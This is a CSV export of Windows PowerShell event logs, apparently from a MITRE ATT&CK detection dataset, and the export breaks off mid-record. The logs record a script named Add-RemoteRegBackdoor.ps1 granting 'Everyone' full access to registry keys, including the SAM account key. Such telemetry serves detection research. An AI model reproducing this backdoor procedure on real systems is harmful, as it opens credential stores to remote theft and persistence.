116,68950,2021-12-09 19:54:03.5875149,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1112,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1112,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SECURITY] Applying Trustee to new Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1112,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Applying Trustee to new Ace\"", ""}]}}"
117,68951,2021-12-09 19:54:03.6031402,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1114,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1114,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SECURITY] Calling SetSecurityDescriptor on the key with the newly created Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1114,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Calling SetSecurityDescriptor on the key with the newly created Ace\"", ""}]}}"
118,68952,2021-12-09 19:54:03.6274694,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1116,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1116,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SECURITY] Backdooring completed for key"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1116,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SECURITY] Backdooring completed for key\"", ""}]}}"
119,68953,2021-12-09 19:54:03.6274694,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1118,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1118,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SAM\SAM\Domains\Account] Backdooring started for key"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1118,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Backdooring started for key\"", ""}]}}"
120,68954,2021-12-09 19:54:03.6349934,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1120,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1120,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SAM\SAM\Domains\Account] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1120,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\"", ""}]}}"
121,68955,2021-12-09 19:54:03.6349934,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1122,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: New-Object,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1122,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(New-Object): ""New-Object"", ParameterBinding(New-Object): name=""TypeName""; value=""System.Management.ManagementClass"", ParameterBinding(New-Object): name=""ArgumentList""; value=""win32_Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1122,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(New-Object): \""New-Object\"", ParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\"", ParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\"", ""}]}}"
122,68956,2021-12-09 19:54:03.6349934,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1124,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1124,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SAM\SAM\Domains\Account] Creating the trustee WMI object with user 'Everyone'"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1124,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Creating the trustee WMI object with user 'Everyone'\"", ""}]}}"
123,68957,2021-12-09 19:54:03.6349934,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1126,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: New-Object,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1126,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(New-Object): ""New-Object"", ParameterBinding(New-Object): name=""TypeName""; value=""System.Management.ManagementClass"", ParameterBinding(New-Object): name=""ArgumentList""; value=""win32_Trustee"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1126,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(New-Object): \""New-Object\"", ParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\"", ParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\"", ""}]}}"
124,68958,2021-12-09 19:54:03.6506374,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1128,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1128,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SAM\SAM\Domains\Account] Applying Trustee to new Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1128,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Applying Trustee to new Ace\"", ""}]}}"
125,68959,2021-12-09 19:54:03.6506374,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1130,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1130,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SAM\SAM\Domains\Account] Calling SetSecurityDescriptor on the key with the newly created Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1130,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SAM\\SAM\\Domains\\Account] Calling SetSecurityDescriptor on the key with the newly created Ace\"", ""}]}}"
126,68960,2021-12-09 19:54:03.6506374,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,3,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1132,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1132,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host 